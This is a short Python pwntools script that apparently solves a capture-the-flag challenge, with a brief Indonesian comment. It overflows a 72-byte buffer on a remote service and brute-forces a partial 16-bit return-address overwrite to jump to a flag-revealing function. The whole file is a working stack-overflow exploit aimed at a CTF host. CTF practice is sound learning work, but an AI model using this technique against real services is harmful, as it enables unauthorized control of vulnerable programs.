from pwn import *
import time

HOST = "tcp-01kyy5f582twc2r5ewhpcy3m01.u-ctf-ctf-7001b39a.urc.tf"
PORT = 443

offset = 72

# area fungsi reveal_flag biasanya tepat sebelum handle_manifest
candidates = [
    0x11d1,
    0x11d5,
    0x11e4,
    0x11e8,
    0x11f8,
    0x120c,
    0x121f,
]

for addr in candidates:
    log.info(f"trying low16 = {addr:#x}")

    io = remote(HOST, PORT, ssl=True, sni=True)
    io.recvuntil(b"Transmit the revised cargo manifest:")

    payload = b"A" * offset + p16(addr)
    io.send(payload)

    data = io.recvall(timeout=2)
    io.close()

    print(data.decode(errors="ignore"))

    if b"uctf{" in data or b"Seal accepted" in data:
        log.success(f"FOUND at low16 = {addr:#x}")
        break

    time.sleep(0.2)
